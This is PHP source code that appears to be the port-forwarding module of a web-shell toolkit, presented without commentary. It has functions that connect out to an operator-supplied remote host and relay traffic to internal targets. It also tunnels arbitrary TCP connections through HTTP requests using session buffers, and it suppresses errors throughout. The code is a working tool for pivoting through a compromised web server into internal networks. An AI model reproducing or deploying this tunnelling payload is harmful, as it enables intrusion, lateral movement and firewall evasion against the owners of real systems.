@error_reporting(0);
function main($action, $targetIP = "", $targetPort = "", $socketHash = "", $remoteIP = "", $remotePort = "", $extraData = "")
{
    switch ($action) {
        case "createRemote":
            set_time_limit(0);
            //fastcgi_finish_request();
            @session_start();
            $_SESSION["remoteRunning"] = true;
            session_write_close();
            global $read, $outers, $targets;
            $ready = false;
            $outers = array();
            $targets = array();
            $read = array();
            $write = array();
            $exp = array();

            $read = array_merge($targets, $outers);
            $init = true;
            while ($_SESSION["remoteRunning"]===true) {

                if ($ready == false) {

                            $outtersocketObj = getSocket($remoteIP, $remotePort);
                            $outterSocket = $outtersocketObj["s"];
                            $s_type = $outtersocketObj["s_type"];
                            $outers[intval($outterSocket)] = $outterSocket;



                            $socketRead = "socket_read";
                            $socketWrite = "socket_write";
                            $socketClose = "socket_close";
                            $socketSelect = "socket_select";
                            if ($s_type == 'stream') {
                                $socketRead = "fread";
                                $socketWrite = "fwrite";
                                $socketClose = "fclose";
                                $socketSelect = "stream_select";
                            }
                            $ready=true;


                }
                $read = array();
                $read = array_merge($targets, $outers);
                if ($socketSelect($read, $write, $exp, 0) > 0) {

                    foreach ($read as $socket_item) {
                        if (in_array($socket_item, $outers)) {

                            $key = intval($socket_item);
                            if (isset($targets[$key])) {
                                $content = $socketRead($socket_item, 204800);
                                if (strlen($content) > 0) {
                                    $socketWrite($targets[$key], $content, strlen($content));
                                } else {
                                    $ready = false;
                                    $socketClose($socket_item);
                                    $socketClose($targets[$key]);
                                    unset($outers[$key]);
                                    unset($targets[$key]);
                                    continue;
                                }
                            } else {
                                $targetSocketObj = getSocket($targetIP, $targetPort);
                                $targetSocket = $targetSocketObj["s"];
                                $targets[$key] = $targetSocket;
                                $content = $socketRead($socket_item, 204800);
                                if (strlen($content) > 0) {
                                    $socketWrite($targetSocket, $content, strlen($content));
                                } else {
                                    $ready = false;
                                    $socketClose($socket_item);
                                    $socketClose($targetSocket);
                                    unset($outers[$key]);
                                    unset($targets[$key]);
                                    continue;
                                }
                                continue;
                            }
                        }
                        if (in_array($socket_item, $targets)) {

                            foreach ($targets as $k => $v) {
                                if ($socket_item == $v) {
                                    if (isset($outers[$k])) {
                                        $content = $socketRead($socket_item, 204800);

                                        if (strlen($content) > 0) {
                                            $socketWrite($outers[$k], $content, strlen($content));
                                        } else {

                                            /*$ready = false;
                                            socket_close($socket_item);
                                            socket_close($outers[$k]);
                                            unset($targets[$k]);
                                            unset($outers[$k]);*/
                                            continue;
                                        }
                                    } else {


                                        $socketClose($socket_item);
                                        unset($targets[$k]);
                                        $ready = false;
                                        continue;
                                    }


                                    /*$content = socket_read($socket_item, 2048);
                                    if (strlen($content)==0)
                                    {
                                        unset($targets[$k]);
                                        continue;
                                    }
                                    socket_write($outers[$k], $content, strlen($content));*/
                                }
                            }
                        }
                    }
                }

                // 当select没有监听到可操作fd的时候，直接continue进入下一次循环
                else {
                    continue;
                }
            }
            break;
        case "createLocal":

            $localSocketObj=getSocket($targetIP,$targetPort);
            $localSocket = $localSocketObj["s"];
            $s_type = $localSocketObj["s_type"];
            if ($s_type == 'error') {
                echo "\x37\x21\x49\x36Failed connecting to target" . $targetIP . ":" . $targetPort;
                return;
            }



                                        $socketRead = "socket_read";
                                        $socketWrite = "socket_write";
                                        $socketClose = "socket_close";
                                        $socketSelect = "socket_select";
                                        if ($s_type == 'stream') {
                                            $socketRead = "fread";
                                            $socketWrite = "fwrite";
                                            $socketClose = "fclose";
                                            $socketSelect = "stream_select";
                                        }
            if ($s_type=='stream')
            {
                stream_set_blocking($localSocket,false );
            }
            else
            {
                socket_set_nonblock($localSocket);
            }

            @session_start();
            $_SESSION["local_running".$socketHash] = true;
            $_SESSION["writebuf".$socketHash] = "";
            $_SESSION["readbuf".$socketHash] = "";
            session_write_close();
            ob_end_clean();
            header("Connection: close");
            ignore_user_abort();
            ob_start();
            $size = ob_get_length();
            header("Content-Length: $size");
            ob_end_flush();
            flush();

            while ($_SESSION["local_running".$socketHash]) {
                $readBuff = "";
                @session_start();
                $_SESSION["localPortMapLock".$socketHash] = "true";
                $writeBuff = $_SESSION["writebuf".$socketHash];
                $_SESSION["writebuf".$socketHash] = "";
                $_SESSION["localPortMapLock".$socketHash] = "false";
                session_write_close();
                if ($writeBuff != "") {
                    $i = $socketWrite($localSocket, $writeBuff, strlen($writeBuff));
                    if ($i === false) {
                        @session_start();
                        $_SESSION["local_running".$socketHash] = false;
                        session_write_close();
                        echo "\x37\x21\x49\x36Failed writing socket";
                    }
                }
                while ($o = $socketRead($localSocket, 20480)) {
                    if ($o === false) {
                        @session_start();
                        $_SESSION["local_running".$socketHash] = false;
                        session_write_close();
                        echo "\x37\x21\x49\x36Failed reading from socket";
                    }
                    $readBuff .= $o;
                }
                if ($readBuff != "") {
                    @session_start();
                    $_SESSION["readbuf".$socketHash] .= $readBuff;
                    session_write_close();
                }
                #sleep(0.2);
            }
            $socketClose($localSocket);
            break;
        case "read":

            @session_start();
            $readBuffer = $_SESSION["readbuf".$socketHash];
            $_SESSION["readbuf".$socketHash] = "";
            $running = $_SESSION["local_running".$socketHash];
            session_write_close();

            if (isset($_SESSION["local_running".$socketHash]))
            {
                if ($running) {
                            header("Connection: Keep-Alive");
                            echo $readBuffer;
                            return;
                        } else if ($running===false){
                            echo "\x37\x21\x49\x36RemoteSocket read filed";
                            return;
                        }
            }

            break;
        case "write": {
        //header('Content-Type: application/octet-stream');
                                $rawPostData = base64_decode($extraData);
                                if ($rawPostData) {

                                 while(true)
                                 {
                                 //sleep(1);
                                 @session_start();
                                 session_write_close();
                                  if ($_SESSION["localPortMapLock".$socketHash]==="false")
                                  {
                                     @session_start();
                                      $_SESSION["writebuf".$socketHash] .= $rawPostData;
                                      session_write_close();
                                      break;
                                  }
                                 }

                                    header("Connection: Keep-Alive");
                                    return;
                                } else {
                                    echo "\x37\x21\x49\x36POST request read filed";
                                }
                /*@session_start();
                $running = $_SESSION["local_running".$socketHash];
                session_write_close();
                file_put_contents("status.txt", "write startd before runig" . "\n", FILE_APPEND);
                if (isset($_SESSION["local_running".$socketHash]))
                {
                                if (!$running) {
                                    echo "\x37\x21\x49\x36No more running, close now";
                                    return;
                                }
                                header('Content-Type: application/octet-stream');
                                $rawPostData = base64_decode($extraData);
                                file_put_contents("status.txt", "write to: " . $extraData . "\n", FILE_APPEND);
                                if ($rawPostData) {
                                    @session_start();
                                    $_SESSION["writebuf".$socketHash] .= $rawPostData;
                                    session_write_close();
                                    header("Connection: Keep-Alive");
                                    return;
                                } else {
                                    echo "\x37\x21\x49\x36POST request read filed";
                                }

                }*/

            }
            break;
        case "closeLocal":
            @session_start();
            $running = $_SESSION["local_running"] = false;
            session_write_close();
            break;
        case "closeLocalWorker":
            @session_start();
            $running = $_SESSION["local_running".$socketHash] = false;
            session_write_close();
            break;

        case "closeRemote":
            @session_start();
            $_SESSION["remoteRunning"] = false;
            session_write_close();
            break;
    }
}
function getSocket($ip, $port)
{
    $resultObj=array();
    if (($f = 'stream_socket_client') && is_callable($f)) {
        $s = $f("tcp://{$ip}:{$port}");
        $s_type = 'stream';
    }
    if (!$s && ($f = 'fsockopen') && is_callable($f)) {
        $s = $f($ip, $port);
        $s_type = 'stream';
    }
    if (!$s && ($f = 'socket_create') && is_callable($f)) {
        $s = $f(AF_INET, SOCK_STREAM, SOL_TCP);
        $res = @socket_connect($s, $ip, $port);
        if (!$res) {
            die();
        }
        $s_type = 'socket';
    }
    if (!$s_type) {
        $s_type="error";
        $s='no socket funcs';
    }
    if (!$s) {
        $s_type="error";
        $s='no socket';
    }
    $resultObj["s"]=$s;
    $resultObj["s_type"]=$s_type;
    return $resultObj;
}
